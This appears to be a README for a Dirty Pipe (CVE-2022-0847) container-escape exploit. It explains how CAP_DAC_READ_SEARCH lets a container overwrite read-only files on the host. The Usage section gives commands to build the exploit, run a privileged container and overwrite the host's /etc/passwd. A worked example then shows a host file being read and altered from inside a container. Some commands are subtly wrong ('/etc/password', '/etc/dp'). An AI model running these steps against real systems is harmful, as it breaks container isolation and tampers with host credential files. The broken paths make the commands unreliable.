# CVE-2022-0847
CVE-2022-0847 used to achieve container escape

Slides (in Chinese) available [here](./slides-zh.pdf).

## Introduction
If the kernel is vulnerable to CVE-2022-0847, the attacker can overwrite read-only files (Non-persistent! Visit https://dirtypipe.cm4all.com/ for more detail). However, container can only access files inside container. Fortunately, when given `CAP_DAC_READ_SEARCH`, attacker can now overwrite files on host!

## Usage
```bash
cp /etc/password . # back up /etc/password
gcc dp.c -o dp
docker run --rm -it -v $(pwd):/exp --cap-add=CAP_DAC_READ_SEARCH ubuntu
/exp/dp /etc/passwd 1 ootz: # overwrite /etc/password on host from offset 1
/etc/dp /etc/passwd # dump /etc/passwd on host
```

## Example
First, create a read-only file `/home/vagrant/flag.txt` by root user on host, content of which is `hello world`:
![](images/touch.png)

Then, start a container with capability `CAP_DAC_READ_SEARCH`, first try to dump `/home/vagrant/flag.txt` on host, we get `hello world`:
![](images/dump.png)

then try to overwrite target file from offset 1 with content `abcdefghij`:
![](images/write.png)

dump target file again, now the content is `habcdefghij`! Exit container and check `/home/vagrant/flag.txt` on host, its content is `habcdefghij`.
![](images/dump-1.png)
Yes, we just overwrote a file on host from container!

## Credits
+ https://dirtypipe.cm4all.com/
+ http://stealth.openwall.net/xSports/shocker.c
